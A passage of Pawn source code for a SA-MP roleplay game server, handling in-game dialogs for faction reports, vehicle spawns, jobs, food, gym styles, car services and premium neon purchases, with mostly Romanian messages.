							FactionRaport[f][1][2], FactionRaport[f][2][2], FactionRaport[f][3][2], FactionRaport[f][4][2], FactionRaport[f][5][2], FactionRaport[f][6][2], FactionRaport[f][7][2]);
						case 4,5,6,10,17,18,25,26,27: format(gString, 180, "Type\tRaport Rank 1 - 7\nMats\t%d/%d/%d/%d/%d/%d/%d\nDrugs\t%d/%d/%d/%d/%d/%d/%d", 
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0],
							FactionRaport[f][1][1], FactionRaport[f][2][1], FactionRaport[f][3][1], FactionRaport[f][4][1], FactionRaport[f][5][1], FactionRaport[f][6][1], FactionRaport[f][7][1]);
						case 12,15,23: format(gString, 130, "Type\tRaport Rank 1 - 7\nPlayers shipped\t%d/%d/%d/%d/%d/%d/%d\n",
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0]);
						case 13,20: format(gString, 130, "Type\tRaport Rank 1 - 7\nPlayers Healed\t%d/%d/%d/%d/%d/%d/%d\n",
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0]);
						case 7,16,21: format(gString, 130, "Type\tRaport Rank 1 - 7\nLicense ofered\t%d/%d/%d/%d/%d/%d/%d\n",
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0]);
						case 8,22: format(gString, 180, "Type\tRaport Rank 1 - 7\nTrailed vehicles\t%d/%d/%d/%d/%d/%d/%d\nRepaired vehicles\t%d/%d/%d/%d/%d/%d/%d\nTanks filled\t%d/%d/%d/%d/%d/%d/%d", 
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0],
							FactionRaport[f][1][1], FactionRaport[f][2][1], FactionRaport[f][3][1], FactionRaport[f][4][1], FactionRaport[f][5][1], FactionRaport[f][6][1], FactionRaport[f][7][1],
							FactionRaport[f][1][2], FactionRaport[f][2][2], FactionRaport[f][3][2], FactionRaport[f][4][2], FactionRaport[f][5][2], FactionRaport[f][6][2], FactionRaport[f][7][2]);
						case 11: format(gString, 130, "Type\tRaport Rank 1 - 7\nContracts\t%d/%d/%d/%d/%d/%d/%d\n",
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0]);
						case 9: format(gString, 180, "Type\tRaport Rank 1 - 7\nFree ad sessions\t%d/%d/%d/%d/%d/%d/%d\nNews\t%d/%d/%d/%d/%d/%d/%d\nLivestreams\t%d/%d/%d/%d/%d/%d/%d", 
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0],
							FactionRaport[f][1][1], FactionRaport[f][2][1], FactionRaport[f][3][1], FactionRaport[f][4][1], FactionRaport[f][5][1], FactionRaport[f][6][1], FactionRaport[f][7][1],
							FactionRaport[f][1][2], FactionRaport[f][2][2], FactionRaport[f][3][2], FactionRaport[f][4][2], FactionRaport[f][5][2], FactionRaport[f][6][2], FactionRaport[f][7][2]);
					}
					ShowPlayerDialog(playerid, DIALOG_EDITRAPORT, DIALOG_STYLE_TABLIST_HEADERS, "Edit Raport:", gString, "Select", "Close");
				}
				case 4: {
					SetPlayerCheckpoint(playerid, DynamicFactions[f][svf_v_X],DynamicFactions[f][svf_v_Y],DynamicFactions[f][svf_v_Z], 5.0);
					CP[playerid] = 43;

					ShowPlayerDialog(playerid, DIALOG_MOVESVF_V, DIALOG_STYLE_MSGBOX, "Move spawn vehicle (SVF)", "You are sure move vehicle spawn?", "Yes", "No");
				}
				case 5: {
					SetPlayerCheckpoint(playerid, DynamicFactions[f][svf_e_X],DynamicFactions[f][svf_e_Y],DynamicFactions[f][svf_e_Z], 5.0);
					CP[playerid] = 43;

					ShowPlayerDialog(playerid, DIALOG_MOVESVF_E, DIALOG_STYLE_MSGBOX, "Move spawn plane (SVF)", "You are sure move plane spawn?", "Yes", "No");
				}
			}
		}
		case DIALOG_MOVESVF_E: {
			if !response *then
				return true;

			new vehicleid = GetPlayerVehicleID(playerid);
			if !vehicleid *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa fi intr-un vehicul.");

			new f = listitemm[playerid];
			GetVehiclePos(vehicleid, DynamicFactions[f][svf_e_X],DynamicFactions[f][svf_e_Y],DynamicFactions[f][svf_e_Z]);
			GetVehicleZAngle(vehicleid, DynamicFactions[f][svf_e_Rot]);

			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
			format(gString, 256, "(Faction System) {FFFFFF}Admin %s a mutat cordonatele la spawn vehicle (SVF) factiuni %s (ID: %d).", GetName(playerid), DynamicFactions[f][fName], f);
			SendAdminMessage(COLOR_PURPLE, gString, 5);

			mysql_format(SQL, gString, 256, "UPDATE `factions` SET `eX` = '%f', `eY` = '%f', `eZ` = '%f', `eRot` = '%f' WHERE `ID` = '%i'",
				DynamicFactions[f][svf_e_X],DynamicFactions[f][svf_e_Y],DynamicFactions[f][svf_e_Z], DynamicFactions[f][svf_e_Rot],DynamicFactions[f][fID]);
			mysql_tquery(SQL, gString);
		}
		case DIALOG_MOVESVF_V: {
			if !response *then
				return true;

			new vehicleid = GetPlayerVehicleID(playerid);
			if !vehicleid *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa fi intr-un vehicul.");

			new f = listitemm[playerid];
			GetVehiclePos(vehicleid, DynamicFactions[f][svf_v_X],DynamicFactions[f][svf_v_Y],DynamicFactions[f][svf_v_Z]);
			GetVehicleZAngle(vehicleid, DynamicFactions[f][svf_v_Rot]);
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
			
			format(gString, 256, "(Faction System) {FFFFFF}Admin %s a mutat cordonatele la spawn vehicle (SVF) factiuni %s (ID: %d).", GetName(playerid), DynamicFactions[f][fName], f);
			SendAdminMessage(COLOR_PURPLE, gString, 5);

			mysql_format(SQL, gString, 256, "UPDATE `factions` SET `vX` = '%f', `vY` = '%f', `vZ` = '%f', `vRot` = '%f' WHERE `ID` = '%i'",
				DynamicFactions[f][svf_v_X],DynamicFactions[f][svf_v_Y],DynamicFactions[f][svf_v_Z], DynamicFactions[f][svf_v_Rot],DynamicFactions[f][fID]);
			mysql_tquery(SQL, gString);
		}
		case DIALOG_EDITRAPORT: {
			if(!response)
				return bool:true;

			new id = listitemm[playerid], i = listitem;
			SelectedPlayers[playerid][0] = i;
			format(gString, 125, "Ranks\tRaport\nRank 1\t%d\nRank 2\t%d\nRank 3\t%d\nRank 4\t%d\nRank 5\t%d\nRank 6\t%d\nRank 7\t%d", FactionRaport[id][1][i], FactionRaport[id][2][i], FactionRaport[id][3][i], FactionRaport[id][4][i], FactionRaport[id][5][i], FactionRaport[id][6][i], FactionRaport[id][7][i]);
			ShowPlayerDialog(playerid, DIALOG_RAPORTRANK, DIALOG_STYLE_TABLIST_HEADERS, "Edit Raport: Select Rank", gString, "Select", "Close");
		}
		case DIALOG_RAPORTRANK: {
			if(!response)
				return bool:true;

			SelectedPlayers[playerid][1] = listitem;
			ShowPlayerDialog(playerid, DIALOG_RAPORTVALUE, DIALOG_STYLE_INPUT, "Edit Raport: Value", "Insert raport rank value:", "Done", "Close");
		}
		case DIALOG_RAPORTVALUE: {
			if(!response)
				return bool:true;

			if(!IsNumeric(inputtext))
				return ShowPlayerDialog(playerid, DIALOG_RAPORTVALUE, DIALOG_STYLE_INPUT, "Edit Raport: Value", "Insert raport rank value:", "Done", "Close");

			new id = listitemm[playerid], r = SelectedPlayers[playerid][1]+1, i = SelectedPlayers[playerid][0];
			FactionRaport[id][r][i] = strval(inputtext);
			gQuery[0] = EOS;
			mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `factions` SET `RaportRank%d` = '%i %i %d' WHERE `ID` = '%d'", r, FactionRaport[id][r][0], FactionRaport[id][r][1], FactionRaport[id][r][2], DynamicFactions[id][fID]);
			mysql_tquery(SQL, gQuery);
			format(gString, 150, "(/editfaction) {FFFFFF}%s a editat raport la factiunea %s, %s in %d rank %d.", GetName(playerid), FactionName(id), RaportName(id, i), strval(inputtext), r);
			SendAdminMessage(COLOR_LIGHTRED, gString, 6);
		}
		case DIALOG_FOOD: {
			if(!response)
				return true;

			switch(listitem) {
				case 0: {
					if(GetPlayerCash(playerid) < 2000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de bani.");
					if(PlayerInfo[playerid][pHunger][0] >= 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja 5 tipuri de mancare de acest fel.");
					GivePlayerCash(playerid, -2000);
					SendClientMessage(playerid, COLOR_MONEY, "You bought a soup for $2000. Use (/eat) to eat your foods.");
					PlayerInfo[playerid][pHunger][0] ++;
				}
				case 1: {
					if(GetPlayerCash(playerid) < 6000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de bani.");
					if(PlayerInfo[playerid][pHunger][2] >= 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja 5 tipuri de mancare de acest fel.");
					GivePlayerCash(playerid, -6000);
					SendClientMessage(playerid, COLOR_MONEY, "You bought a tuna for $6000. Use (/eat) to eat your foods.");
					PlayerInfo[playerid][pHunger][2] ++;
				}
				case 2: {
					if(GetPlayerCash(playerid) < 8000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de bani.");
					if(PlayerInfo[playerid][pHunger][3] >= 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja 5 tipuri de mancare de acest fel.");
					GivePlayerCash(playerid, -8000);
					SendClientMessage(playerid, COLOR_MONEY, "You bought a steak for $8000. Use (/eat) to eat your foods.");
					PlayerInfo[playerid][pHunger][3] ++;
				}
			}
			CheckMission(playerid, 39);
			save_hunger(playerid);
		}
		case DIALOG_EDITFACTION1: {
			if(!response)
				return true;

			new f = listitemm[playerid];
			format(gString, 256, "(Faction System) {FFFFFF}Admin %s a schimbat numele factiuni %s in %s (ID: %d).", GetName(playerid), DynamicFactions[f][fName], inputtext, f);
			SendAdminMessage(COLOR_PURPLE, gString, 5);

			strmid(DynamicFactions[f][fName], inputtext, 0, 40);
			updateFaction(f, true);

			mysql_format(SQL, gString, 256, "UPDATE `factions` SET `Name` = '%e' WHERE `ID` = '%i'",
				DynamicFactions[f][fName],DynamicFactions[f][fID]);
			mysql_tquery(SQL, gString);					
		}
    	case DIALOG_SVF: {
			if(!response)
				return true;

			if(IsPlayerInAnyVehicle(playerid))
				return true;

			if(svfCar[playerid])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja un vehicul spawnat pentru factiune.");

			new f = listitemm[playerid];
			if(PlayerInfo[playerid][pRank] < svfInfo[f][listitem][svf_Rank])
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai rankul necesar pentru a spawna acest vehicul.");

			if(svfInfo[f][listitem][svf_Stock]<=0)
				return SendClientMessage(playerid, COLOR_GREY, "Nu mai sunt vehicule in stock.");

			if(IsAPlane(svfInfo[f][listitem][svf_Model])) {
				if(PlayerInfo[playerid][pFlyLicT] < 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de licenta de zbor pentru acest vehicul!");
			} else if(PlayerInfo[playerid][pCarLicT] < 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de licenta de driving pentru acest vehicul!");

			VehicleSVF[createSvfCar(playerid, svfInfo[f][listitem][svf_Model], f, svfInfo[f][listitem][svf_Rank], svfInfo[f][listitem][svf_Color1], svfInfo[f][listitem][svf_Color2])] = 
			listitem; 
			svfInfo[f][listitem][svf_Stock]--;

			format(gString, 128, "%s has spawned a %s (rank: %d, remaining stock: %d).", GetName(playerid), GetVehicleName(svfInfo[f][listitem][svf_Model]), svfInfo[f][listitem][svf_Rank], svfInfo[f][listitem][svf_Stock]);
			SendFactionMessage(f, COLOR_LGREEN, gString);
			SendClientMessage(playerid, -1, "Poti despawna vehiculul prin (/dvf). Nu uita ca acesta se despawneaza singur daca mori sau daca vehiculul bubuie.");
			SendClientMessage(playerid, -1, "Pentru a localiza vehiculul poti folosi (/lvf).");
		}
		case DIALOG_GYM: {
			if(!response) return true;
			if InInterior[playerid] != BUSINESS_INTERIOR *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un business!");

			new const gymPrice[6] = {300000, 500000, 500000, 500000, 500000, 100000};
			if(GetPlayerCash(playerid) < gymPrice[listitem]) return SendClientMessage(playerid, -1, "You don't have enough money.");
			GivePlayerCash(playerid, -gymPrice[listitem]);
			BizzInfo[InInteriorID[playerid]][bBalance] += gymPrice[listitem];
	        switch(listitem) {
				case 0: SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
				case 1: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
				case 2: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
				case 3: SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
				case 4: SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
				case 5: SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
			}
			CheckMission(playerid, 19);
			SendClientMessage(playerid, COLOR_WHITE, "You have successfully purchased this style of fighting.");
			PlayerInfo[playerid][pFightStyle] = listitem!=5?listitem+1:0;
			UpdateVar(playerid, "FightStyle", PlayerInfo[playerid][pFightStyle]);
  		}
    	case DIALOG_GOTOJOB: {
    		if(!response)
    			return true;

    		new i = listitem+1;
    		SetPlayerPos(playerid, JobInfo[i][jPosX], JobInfo[i][jPosY], JobInfo[i][jPosZ]);
    		SetPlayerVirtualWorld(playerid, 0);
    		SetPlayerInterior(playerid, 0);

    		InInterior[playerid]=InInteriorID[playerid]=INVALID_INTERIOR;
    		SCMf(playerid, COLOR_YELLOW, "Te-ai teleportat la job %s.", JobInfo[i][jName]);
    	}
    	case DIALOG_DRUGS: {
    		if(!response)
    			return true;

    		switch(listitem) {
    			case 0: SendClientMessage(playerid, COLOR_YELLOW, "Ai primit 1 droguri!"), PlayerInfo[playerid][pDrugs]++, UpdateVar(playerid, "Drugs", PlayerInfo[playerid][pDrugs]);
    			case 1: {
    				SCMf(playerid, COLOR_YELLOW, "Ai primit $%s deoarece ai vandut cele 1 droguri!", FormatNumber(CurseFacute[playerid]));
    				GivePlayerCash(playerid, CurseFacute[playerid]);
    			}
    		}
    	}
    	case DIALOG_MATERIALS1: {
    		JobWorking[playerid] = false;
    		if(!response)
    			return true;

    		switch(listitem) {
    			case 0: {
    				PlayerInfo[playerid][pMats] += CurseFacute[playerid];
    				UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
    				SCMf(playerid, COLOR_YELLOW, "Ai primit %d materiale!", CurseFacute[playerid]);
    			}
    			case 1: {
    				GivePlayerCash(playerid, CurseFacute[playerid]*10);
    				SCMf(playerid, COLOR_YELLOW, "Ai primit $%s deoarece ai vandut cele %d materiale!", FormatNumber(CurseFacute[playerid]*10), CurseFacute[playerid]);
    			}
    		}
    	}
    	case DIALOG_MATERIALS: {
    		if(!response)
    			return true;

    		switch(listitem) {
    			case 0: SetPlayerCheckpoint(playerid, -248.7563,2598.7144,62.8582, 3.0);
    			case 1: SetPlayerCheckpoint(playerid, 2558.4790,-1211.8296,54.5313, 3.0);
    			case 2: SetPlayerCheckpoint(playerid, 251.1599,31.3631,2.1833, 3.0);
    			case 3: SetPlayerCheckpoint(playerid, -265.4337,994.4671,19.4678, 3.0);
    		}
    		JobWorking[playerid] = true;
    		SendClientMessage(playerid, COLOR_YELLOW, "Du-te la punctul rosu marcat pe map pentru a lua materiale!");
    		CP[playerid] = 705;
    	}
    	case DIALOG_JOBTYPE: {
    		if(!response)
    			return true;

    		new Float:Pos[4];
    		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    		GetPlayerFacingAngle(playerid, Pos[3]);
    		switch(PlayerInfo[playerid][pJob]) {
    			case 1: {
    				switch(listitem) {
    					case 0: {
    						CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3]);
							JobSeconds[playerid] = 60;
					    	UpdateJobStats(playerid);
    					}
    					case 1: {
    						new r = random(sizeof vaca_cp);
    						SetPlayerCheckpoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2], 2.0);
    						SCMf(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Distanta pana la urmatoarea vaca: %.1fm.", GetPlayerDistanceFromPoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2]));
    						SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Tip de munca selectat: special.");
    						SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Obtine laptele de la vaci pentru a-l transporta la fabrica de lapte.");
    						_CreateJobVehicle(playerid, 543, Pos[0], Pos[1], Pos[2], Pos[3]);
    						CP[playerid] = 718;
    					}
    				}
    			}
    			case 2: {
    				switch(listitem) {
    					case 0: {
				    		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Tip de munca selectat: normal.");
				    		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Mergi la checkpointul pentru a incepe munca.");	
		    				CreateJobVehicle(playerid, 2468.1194, -2224.4177, 14.4094, 89.9847);
		    				SetPlayerCheckpoint(playerid, 2372.3252,-2285.2036,14.4490, 6.0);
		    				CP[playerid] = 60;
		    			}
		    			case 1: {
		    				if(PlayerInfo[playerid][pJobSkill][2]!=7) 
		    					return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta optiune deblocata, foloseste (/skillupgrade) pentru mai multe detalii.");
		    				
		    				_CreateJobVehicle(playerid, 406, 2418.4160,-2210.3818,15.0111,222.7685);
		    				new r = MoneyEarned[playerid] = random(sizeof stone_object);
    						SetPlayerCheckpoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2], 2.0);
		    				CP[playerid] = 720;
		    				SendClientMessage(playerid, -1, "{75db3d}(Trucker Job) {FFFFFF}Tip de munca selectat: special.");
		    				SCMf(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Distanta pana la urmatoarea piatra: %.1fm.", GetPlayerDistanceFromPoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2]));
		    			}
		    		}
    			}
    			case 11,13,16: {
    				switch(listitem) {
    					case 0: {
    						SendClientMessage(playerid, COLOR_WHITE, "You're now fishing. It will take a few seconds to reel your fish in.");

							GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~PLEASE WAIT~n~~w~~h~fishing...", 3000, 3);
							FishTimer[playerid] = 10;
							TogglePlayerControllable(playerid, 0);
							OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,10000);
							SetPlayerAttachedObject(playerid, 1, 18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
    					}
    					case 1: {
    						switch(PlayerInfo[playerid][pJob]) {
    							case 11: {
		    						if(!IsPlayerInArea(playerid, 2230, 507.5, 2417, 563.5))
		    							return SendClientMessage(playerid, COLOR_GREY, "Nu esti in zona in care poti pescui.");
		    					
		    						_CreateJobVehicle(playerid, 473, 2336.2375,526.8896,-0.2380,140.6040);
		    					}
    							case 13: {
		    						if(!IsPlayerInArea(playerid, 334.4, -2109.1, 425.4, -2076.1))
		    							return SendClientMessage(playerid, COLOR_GREY, "Nu esti in zona in care poti pescui.");
		    					
		    						_CreateJobVehicle(playerid, 473, 383.3894,-2096.9370,-0.3518,178.1745);
		    					}
    							case 16: {
		    						if(!IsPlayerInArea(playerid, -3000, 474.0, -2931, 512.0))
		    							return SendClientMessage(playerid, COLOR_GREY, "Nu esti in zona in care poti pescui.");
		    					
		    						_CreateJobVehicle(playerid, 473, -2992.5254,494.3721,-0.7249,0.6355);
		    					}
    						}
    						set_fish_checkpoint(playerid);
    						SendClientMessage(playerid, -1, "{75db3d}(Fisher Job) {FFFFFF}Tip de munca selectat: special.");
		    				SendClientMessage(playerid, -1, "{75db3d}(Fisher Job) {FFFFFF}Mergi cu barca la checkpoint pentru a prinde 5 pesti.");
		    				SCMf(playerid,-1, "{75db3d}(Fisher Job) {FFFFFF}Urmatoarea locatie unde poti sa pescuesti se afla la %.1fm.", get_distance_fish(playerid));
    					}
    				}
    			}
    			case 9: {
    				switch(listitem) {
    					case false: {
    						SendClientMessage(playerid, -1, "{75db3d}(Pizza Job) {FFFFFF}Tip de munca selectat: normal.");
    						CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3], 3,41);
							new h = random(sql_houses);
							SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 5.0);
							CP[playerid] = 710;
							format(gString, 128, "du-te la punctul ~r~~h~rosu ~w~~h~de pe mapa pentru a livra pizza.~n~distanta: ~y~%.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]));
							showInfo(playerid, gString, 10);
    					}
    					case true: {
    						SendClientMessage(playerid, -1, "{75db3d}(Pizza Job) {FFFFFF}Tip de munca selectat: special.");
    						SendClientMessage(playerid, -1, "{75db3d}(Pizza Job) {FFFFFF}Mergi in interiorul de la job pentru a face pizza.");
    						JobWorking[playerid] = 2;
    					}
     				}
    			}
    			case 3: {
    				switch(listitem) {
    					case 0: {
    						SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Lumberjack Job) {FFFFFF}Tip de munca selectat: normal.");
				    		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Lumberjack Job) {FFFFFF}Mergi la checkpoint-ul setat de pe mapa pentru a ajunge la copaci.");	

    						BagTime[playerid] = 
							CurseFacute[playerid] = 0;
							InHand[playerid] = false;
	   						CreateJobVehicle(playerid, -592.3708,-1081.1364,23.5041,236.9593);
	   						SetPlayerCheckpoint(playerid, -651.0809,-1596.1952,24.0171, 6.0);
	    					CP[playerid] = 701;
    					}//normal work
    					case 1: {
    						SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Lumberjack Job) {FFFFFF}Tip de munca selectat: special.");
				    		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Lumberjack Job) {FFFFFF}Mergi la checkpoint-ul setat de pe mapa pentru a ajunge la copaci.");	

    						BagTime[playerid] = 
							CurseFacute[playerid] = 0;
							InHand[playerid] = false;
							SpecialJobWorking[playerid] = true;
	   						_CreateJobVehicle(playerid, 578, -588.8641,-1080.5580,24.1727,191.4424);
	   						SetPlayerCheckpoint(playerid, -651.0809,-1596.1952,24.0171, 6.0);
	   						CP[playerid] = 701;
    					}//special work
    				}
    			}
    		}
    	}
    	case DIALOG_RAINBOWSPEED: {
    		if(!response)
    			return true;

    		new idd = FindSpawnID(GetPlayerVehicleID(playerid));
    		if(idd == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in unul dintre vehiculele tale personale!");
		    masinaRainbow[playerid] = CarInfo[idd][Spawned];

		    if(PlayerRainbow[playerid] != 0) {
		   		if(Iter_Contains(Rainbows<PlayerRainbow[playerid]>, playerid)) Iter_Remove(Rainbows<PlayerRainbow[playerid]>, playerid);
		   	}
		   	tograinbow[playerid] = listitem;
			UpdateVar(playerid, "TogRainBow", listitem);
		   	PlayerRainbow[playerid] = listitem;
		   	K[playerid] = 0;
			switch(listitem) {
				case 0: {
					SendClientMessage(playerid, COLOR_WHITE, "* You have disabled rainbow speed!");
					ChangeVehicleColorEx(CarInfo[idd][Spawned], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo]);
					return true;
				}
				case 1:	Iter_Add(Rainbows<1>, playerid);
				case 2: Iter_Add(Rainbows<2>, playerid);
				case 3: Iter_Add(Rainbows<3>, playerid);
			}  
			SCMf(playerid, COLOR_LGREEN, "* Your rainbow speed is now #%d. (vehicle type: %s)", listitem, CarInfo[idd][cClan]?("Clan"):("Personal"));
    	}
    	case DIALOG_FINDCAR: {
    		if(!response)
    			return true;

			new Float:vehx, Float:vehy, Float:vehz, idd = PlayerInfo[playerid][pCarKey][listitem];
			GetVehiclePos(CarInfo[idd][Spawned], vehx, vehy, vehz);
			SetPlayerCheckpoint(playerid, vehx, vehy, vehz, 3.0);
			CP[playerid] = 53;
    	}
    	case DIALOG_TOWCAR: {
    		if(!response)
    			return true;

    		new idd = PlayerInfo[playerid][pCarKey][listitem];
			if(GetPlayerCash(playerid) < 1000)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai $1.000!");
			
			
			if(IsVehicleOccupied(CarInfo[idd][Spawned])) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau este ocupat!");
			
			if(CarInfo[idd][Confiscated]) 
				return SendClientMessage(playerid, -1, "Acest vehicul este confiscat deoarece a fost parcat neregulamentar! Plateste amenda (ultimul rand din meniu).");
			
			if(IsAttached(CarInfo[idd][Spawned])) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta functie momentan!");
			
			GivePlayerCash(playerid, -1000);
			format(gString, 65, "Your %s has been respawned. Please wait 4 seconds..", aVehicleNames[CarInfo[idd][cModel]-400]);
			SendClientMessage(playerid, COLOR_CLIENT, gString);
    		SetTimerEx("setVehicleRespawn", 4000, false, "i", idd);
    	}
    	case DIALOG_NEON: {
    		if(!response)
    			return true;

    		listitemm[playerid] = listitem;

    		ShowPlayerDialog(playerid, DIALOG_BUYNEON, DIALOG_STYLE_MSGBOX, "Neon", "Esti sigur ca vrei sa achizitionezi aceste neoane?", "Da", "Nu");
    	}
    	case DIALOG_BUYNEON: {
    		if(!response)
    			return true;

    		if(!IsPlayerInAnyVehicle(playerid))
    			return true;

    		new idd = FindSpawnID(GetPlayerVehicleID(playerid)),clan;
    		if(idd == -1)
    			return true;

    		if(CarInfo[idd][cSNeon]) return SendClientMessage(playerid, COLOR_LIGHTGREEN, "EROARE: Ai deja functia 'special neon' pe acest vehicul!");

    		new const neon_price[7] = {169, 269, 369, 469, 569, 669, 1690};
    		if(!CarInfo[idd][cClan]) {
	    		if(PlayerInfo[playerid][pPremiumPoints] < neon_price[listitemm[playerid]])
	    			return SendClientMessage(playerid, COLOR_WHITE, "Nu ai aceasta suma de puncte premium.");

	    		if(!CarInfo[idd][cNeon] && listitemm[playerid] == 6) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de neon pentru a pune special neon!");
	    	} else {
	    		clan = CarInfo[idd][cClan];
	    		if(ClanInfo[clan][clPremiumPoints] < neon_price[listitemm[playerid]])
	    			return SendClientMessage(playerid, COLOR_WHITE, "Nu sunt suficiente puncte premium points in clan!");
	    	}

    		if(CarInfo[idd][cNeon] != 0) {
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][0]); CarInfo[idd][cNeonObj][0] = INVALID_OBJECT_ID;
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][1]); CarInfo[idd][cNeonObj][1] = INVALID_OBJECT_ID;
    		}

    		if(listitemm[playerid]!=6) {
    			CarInfo[idd][cNeon] = listitemm[playerid]+1;
	    		new const neonObj[6] = {18652, 18651, 18650, 18649, 18648, 18647};
	    		CarInfo[idd][cNeonObj_][0] = CarInfo[idd][cNeonObj_][1] = neonObj[listitemm[playerid]];
	    		SCMf(playerid, -1, "Neons have been attached to your vehicle. (-%d premium points) [carid: #%d]", neon_price[listitemm[playerid]], CarInfo[idd][cID]);
    		} else {
    			SCMf(playerid, -1, "Special Neon Upgrade! Use (/neon) to neon menu. (-1690 premium points) [carid: #%d]", CarInfo[idd][cID]);
    			CarInfo[idd][cNeonObj_][0] = CarInfo[idd][cNeonObj_][1] = 18647;
    			CarInfo[idd][cSNeon] = true;
    		}

    		if(!CarInfo[idd][cClan]) {
    			PlayerInfo[playerid][pPremiumPoints] -= neon_price[listitemm[playerid]];
    			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
    			_query("UPDATE `cars` SET `Neon`='%d', `NeonObj` = '%i %i', `SNeon` = '%i' WHERE `ID`='%d'", listitemm[playerid]+1, CarInfo[idd][cNeonObj_][0], CarInfo[idd][cNeonObj_][1], CarInfo[idd][cSNeon], CarInfo[idd][cID]);
    		} else {
    			ClanInfo[clan][clPremiumPoints] -= neon_price[listitemm[playerid]];
    			_query("UPDATE `clans` SET `PremiumPoints` = '%i' WHERE `ID` = '%i'", ClanInfo[clan][clPremiumPoints], ClanInfo[clan][cID]);
	    		_query("UPDATE `clanvehicle` SET `Neon`='%d', `NeonObj` = '%i %i' WHERE `ID`='%d'", listitemm[playerid]+1, CarInfo[idd][cNeonObj_][0], CarInfo[idd][cNeonObj_][1], CarInfo[idd][cID]);
    		}
    		AttachNeon(idd);
    	}
    	case DIALOG_SETGUN: {
    		if(!response)
    			return true;

    		if(PlayerInfo[playerid][pRank] < GunMafie[listitem][gunRank])
